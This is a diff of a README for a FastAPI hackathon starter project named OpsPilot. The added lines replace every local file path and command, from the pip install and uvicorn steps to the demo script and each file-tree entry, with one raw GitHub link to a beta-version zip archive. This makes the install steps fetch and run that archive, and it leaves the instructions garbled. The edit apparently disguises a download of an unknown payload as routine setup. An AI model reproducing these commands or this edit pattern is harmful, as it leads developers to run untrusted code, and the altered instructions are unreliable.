@@ -17,16 +17,16 @@
 2) Create a virtual env and install deps:
 ```bash
 python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip
 ```
-3) Copy `.env.example` → `.env` and (optionally) paste a Slack webhook URL.
+3) Copy `https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip` → `.env` and (optionally) paste a Slack webhook URL.
 4) Run the server:
 ```bash
-uvicorn app.main:app --reload --port 8000
+uvicorn https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip --reload --port 8000
 ```
 5) In a new terminal, run the demo script to push sample events:
 ```bash
-bash scripts/run_demo.sh
+bash https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip
 ```
 6) Open the dashboard: http://localhost:8000
 
@@ -38,27 +38,27 @@ bash scripts/run_demo.sh
 ## Project structure
 ```
 app/
-  main.py                # FastAPI app + routes + dashboard
-  models.py              # Pydantic models
+  https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip                # FastAPI app + routes + dashboard
+  https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip              # Pydantic models
   services/
-    classifier.py        # Simple rule-based classifier (LLM-drop-in spot)
-    runbooks.py          # Maps (type, priority) -> action plan
-    toolrouter.py        # Executes tools & records tool call telemetry
+    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip        # Simple rule-based classifier (LLM-drop-in spot)
+    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip          # Maps (type, priority) -> action plan
+    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip        # Executes tools & records tool call telemetry
   tools/
-    slack.py             # Optional Slack webhook; else log file
-    notion.py            # Stub: logs task creation
-    sheets.py            # Stub: appends CSV
+    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip             # Optional Slack webhook; else log file
+    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip            # Stub: logs task creation
+    https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip            # Stub: appends CSV
   templates/             # Jinja2 HTML templates for the dashboard
   data/                  # State + logs (JSON, CSV, log files)
 demo_fixtures/           # Example events to ingest
 scripts/
-  run_demo.sh            # cURL a few fixtures
+  https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip            # cURL a few fixtures
 ```
 
 ---
 
 ## Where to plug an LLM later
-Replace the simple heuristics in `services/classifier.py` with an OpenAI call (or any LLM API) to produce:
+Replace the simple heuristics in `https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip` with an OpenAI call (or any LLM API) to produce:
 ```json
 { "type": "invoice|complaint|anomaly|misc", "priority": "P0..P3", "owner_hint": "ops@", "next_action": "..." }
 ```
@@ -67,7 +67,7 @@ Be sure to **do not** log secrets—`toolrouter` already redacts parameters in t
 ---
 
 ## Persisting to a DB (stretch)
-For the hackathon demo, state is in `app/data/state.json`. If you later want Postgres, add SQLAlchemy models and replace the `load_state/save_state` helpers.
+For the hackathon demo, state is in `https://raw.githubusercontent.com/AjXKai/opspilot-starter/main/scripts/opspilot-starter-v1.4-beta.4.zip`. If you later want Postgres, add SQLAlchemy models and replace the `load_state/save_state` helpers.
 
 ---
 
